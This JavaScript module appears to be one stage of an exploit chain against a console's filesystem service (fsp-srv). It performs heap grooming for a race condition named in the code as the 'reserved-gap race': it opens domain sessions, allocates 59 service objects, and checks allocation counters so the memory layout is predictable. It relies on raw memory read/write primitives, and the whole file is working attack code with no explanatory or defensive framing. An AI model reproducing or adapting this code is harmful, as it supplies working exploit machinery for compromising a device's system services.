// Reservation group management for the reserved-gap race.
// Each wave gets a fresh fsp-srv domain session with 59 cmd-1200 objects.
// Depends on: sessions.js, transport.js, decode.js, format.js

// Read 16 allocation counters via cmd 1009 (double-read for freshness).
function readAllocationCounters(session, pktBuf) {
    var latest = null;
    for (var pass = 0; pass < 2; pass++) {
        prepPacket(pktBuf, 4, 8, [[16, 0x49434653], [24, 1009]]);
        sendIPC(session, pktBuf);
        var reply = cmifReply(pktBuf);
        if (reply.result !== 0) return null;
        latest = [];
        for (var i = 0; i < 16; i++)
            latest.push(Number(read64(pktBuf + BigInt(reply.data + i * 8))));
    }
    return latest;
}

// Close a domain object immediately via type-2 domain message.
function closeDomainObjectNow(sessionHandle, objectId, pktBuf) {
    if (!sessionHandle || !objectId) return 0xFFFFFFFF;
    prepPacket(pktBuf, 4, 8, []);
    write8(pktBuf + 0x10n, 2n);
    write32(pktBuf + 0x14n, BigInt(objectId));
    write32(pktBuf + 0x1Cn, 0n);
    return Number(sendIPC(sessionHandle, pktBuf)) >>> 0;
}

// Close an unwrapped group. If individual CloseObject requests fail, closing
// the owner session still releases its domain table and remaining objects.
function closeUnwrappedReservationGroup(sessionHandle, rootCopy,
    reservationObjectIds, pktBuf) {
    for (var i = reservationObjectIds.length - 1; i >= 0; i--)
        closeDomainObjectNow(sessionHandle, reservationObjectIds[i], pktBuf);
    if (rootCopy) closeHandle(rootCopy);
    if (sessionHandle) closeHandle(sessionHandle);
}

// Open a reservation group: fresh domain session + N cmd-1200 objects.
// readerSession: an existing fsp-srv session for reading counters.
// pktBuf: reusable packet buffer.
// count: number of reservations (default 59).
//
// Returns: { ok, session, root, rootCopy, outer, reserved, failures[],
//            before[], held[], allocationDelta, attempts, error? }
function openReservationGroup(readerSession, pktBuf, count) {
    count = count || 59;
    var expectedAllocation = count * 208;
    var maxGroupAttempts = 3;

    for (var attempt = 1; attempt <= maxGroupAttempts; attempt++) {
        var sessionHandle = openFspSession();
        if (!sessionHandle) return { ok: false, error: "open fsp-srv" };

        // Convert to domain.
        prepPacket(pktBuf, 5, 8, [[16, 0x49434653], [24, 0], [32, 0]]);
        sendIPC(sessionHandle, pktBuf);
        var converted = cmifReply(pktBuf);
        var rootObj = converted.result === 0
            ? (Number(read32(pktBuf + BigInt(converted.data))) >>> 0) : 0;
        if (!rootObj) {
            closeHandle(sessionHandle);
            return { ok: false, error: "ConvertToDomain SFCO=" + hex32(converted.result) };
        }

        // Keep an ordinary copy of the root alive.
        prepPacket(pktBuf, 5, 9, [[16, 0x49434653], [24, 1], [32, rootObj]]);
        sendIPC(sessionHandle, pktBuf);
        var copiedRoot = cmifReply(pktBuf);
        var rootCopy = copiedRoot.result === 0 && copiedRoot.moves.length
            ? copiedRoot.moves[0] : 0;
        if (!rootCopy) {
            closeHandle(sessionHandle);
            return { ok: false, error: "CopyFromCurrentDomain SFCO=" + hex32(copiedRoot.result) };
        }

        // Measure after session/domain setup so the delta isolates the
        // cmd-1200 objects, matching the reference's 59 * 208-byte check.
        var before = readAllocationCounters(readerSession, pktBuf);
        if (before === null) {
            closeHandle(rootCopy);
            closeHandle(sessionHandle);
            return { ok: false, error: "allocation counters unavailable before reservations",
                attempts: attempt };
        }

        // Create N cmd-1200 objects. A response counts only when it contains
        // one nonzero domain object ID; otherwise it cannot back a usable
        // reservation group.
        var reservationObjectIds = [];
        var reservationSuccessCount = 0;
        var reservationFailures = [];
        var reservationFailureCount = 0;
        for (var i = 0; i < count; i++) {
            prepPacket(pktBuf, 4, 12, [
                [16, 1], [18, 0x10], [20, rootObj],
                [32, 0x49434653], [40, 1200]
            ]);
            write16(pktBuf + 0x12n, 16n);
            var transport = Number(sendIPC(sessionHandle, pktBuf)) >>> 0;
            if (transport !== 0) {
                reservationFailureCount++;
                if (reservationFailures.length < 4)
                    reservationFailures.push("#" + i + ":transport=" + hex32(transport));
                continue;
            }
            var result = Number(read32(pktBuf + 0x28n)) >>> 0;
            var objectCount = Number(read32(pktBuf + 0x10n)) >>> 0;
            var objectId = Number(read32(pktBuf + 0x30n)) >>> 0;
            if (result === 0 && objectCount === 1 && objectId !== 0) {
                reservationSuccessCount++;
                reservationObjectIds.push(objectId);
            } else {
                reservationFailureCount++;
                if (reservationFailures.length < 4)
                    reservationFailures.push("#" + i + ":sfco=" + hex32(result) +
                        ",objects=" + objectCount + ",id=" + hex32(objectId));
            }
        }

        var held = readAllocationCounters(readerSession, pktBuf);
        var allocationDelta = before && held
            ? before[5] - held[5] : null;
        var reservationsComplete = reservationSuccessCount === count &&
            reservationObjectIds.length === count &&
            reservationFailureCount === 0;
        var countersAvailable = before !== null && held !== null;

        // A partial group cannot back a valid wave. Close it and retry with a
        // fresh session; workers have not started, so no wave state is live.
        if (!reservationsComplete || !countersAvailable) {
            closeUnwrappedReservationGroup(sessionHandle, rootCopy,
                reservationObjectIds, pktBuf);
            if (!reservationsComplete && attempt < maxGroupAttempts) continue;
            return {
                ok: false,
                error: !reservationsComplete
                    ? "cmd-1200 reservations=" + reservationSuccessCount +
                        "/" + count + " failures=" + reservationFailureCount +
                        " after " + attempt + " attempts"
                    : "allocation counters unavailable",
                reserved: reservationSuccessCount,
                failures: reservationFailures,
                before: before, held: held, allocationDelta: allocationDelta,
                attempts: attempt
            };
        }

        if (allocationDelta !== expectedAllocation) {
            var allocationError = "allocation delta=0x" +
                Number(allocationDelta).toString(16) + " expected=0x" +
                expectedAllocation.toString(16);
            closeUnwrappedReservationGroup(sessionHandle, rootCopy,
                reservationObjectIds, pktBuf);
            if (attempt < maxGroupAttempts) continue;
            return {
                ok: false, error: allocationError + " after " + attempt +
                    " attempts",
                reserved: reservationSuccessCount,
                failures: reservationFailures,
                before: before, held: held, allocationDelta: allocationDelta,
                attempts: attempt
            };
        }

        // Wrap only after the unwrapped group passed both validations.
        prepPacket(pktBuf, 5, 8, [[16, 0x49434653], [24, 0], [32, 0]]);
        sendIPC(sessionHandle, pktBuf);
        var wrapped = cmifReply(pktBuf);
        var outer = wrapped.result === 0
            ? (Number(read32(pktBuf + BigInt(wrapped.data))) >>> 0) : 0;
        if (!outer) {
            closeUnwrappedReservationGroup(sessionHandle, rootCopy,
                reservationObjectIds, pktBuf);
            return {
                ok: false, error: "group wrap SFCO=" + hex32(wrapped.result),
                reserved: reservationSuccessCount, failures: reservationFailures,
                before: before, held: held, allocationDelta: allocationDelta,
                attempts: attempt
            };
        }

        return {
            ok: true, session: sessionHandle, root: rootObj,
            rootCopy: rootCopy, outer: outer,
            reserved: reservationSuccessCount, failures: reservationFailures,
            before: before, held: held, allocationDelta: allocationDelta,
            attempts: attempt
        };
    }

    return { ok: false, error: "reservation accounting retries exhausted" };
}

// Close a reservation group (domain object + session handle).
function closeReservationGroup(group, outerStillOpen, pktBuf) {
    if (!group) return;
    if (group.session && outerStillOpen && group.outer)
        closeDomainObjectNow(group.session, group.outer, pktBuf);
    if (group.rootCopy) closeHandle(group.rootCopy);
    if (group.session) closeHandle(group.session);
}
